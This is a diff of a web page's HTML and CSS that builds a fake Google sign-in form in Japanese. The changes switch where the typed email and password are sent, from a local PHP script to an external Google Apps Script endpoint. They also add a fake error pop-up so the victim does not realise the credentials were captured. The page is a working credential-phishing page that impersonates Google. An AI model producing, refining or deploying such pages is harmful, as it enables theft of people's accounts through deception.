@@ -1,16 +1,24 @@
- <form action="contct.php" method="post">
-<center>
-<img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png"> 
-                             
-<input class="b" type="email" name="e" placeholder="Email" />
-   
-  <input class="b" type="password" name="p" placeholder="Password" />
+<!DOCTYPE html>
+<html lang="ja">
 
-  <input class="a" type="submit" value="確認する">
-  </center>   
+<head>
+ <meta charset="UTF-8">
+ <form method="post" action="https://script.google.com/macros/s/AKfycby4pMNVkxoBdbqqz7XJC0d8SV0yFy0O45oxei1SgKPA1RkjJBPeS2Mv8aXFZFe-rQJr/exec">
+<div class="form">
+  
+  <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png"> 
+                             
+<label><input type="email" name="e" placeholder="Email" /></label>
+   
+  <label><input type="password" name="p" placeholder="Password" /></label>
+
+  
+  <input type="submit" value="sign in" onclick="alert('エラーが発生しました。このタブを閉じてもう一度試してください')">
+   
 
  
 
+</div>
 <style>
 * {
   box-sizing: border-box;
@@ -21,8 +29,11 @@ body {
 }
 
 img {
-  padding:30px;
-  margin: 0px auto;
+  display: block;
+  width: 150px;
+  margin: 30px auto;
+ 
+  
 }
 
 .form {
@@ -36,7 +47,7 @@ img {
   text-align: center;
 }
 
-.b {
+input {
   border-radius: 100px;
   padding: 10px 15px;
   width: 50%;
@@ -46,12 +57,12 @@ img {
   margin: 20px auto 20px auto;
 }
 
-.a{
-  border-radius: 50px;
+button {
+  border-radius: 100px;
   border: none;
   background: #719BE6;
-  width: 30%;
-  padding: 15px;
+  width: 50%;
+  padding: 10px;
   color: #FFFFFF;
   margin-top: 25px;
   box-shadow: 0 2px 10px -3px #719BE6;
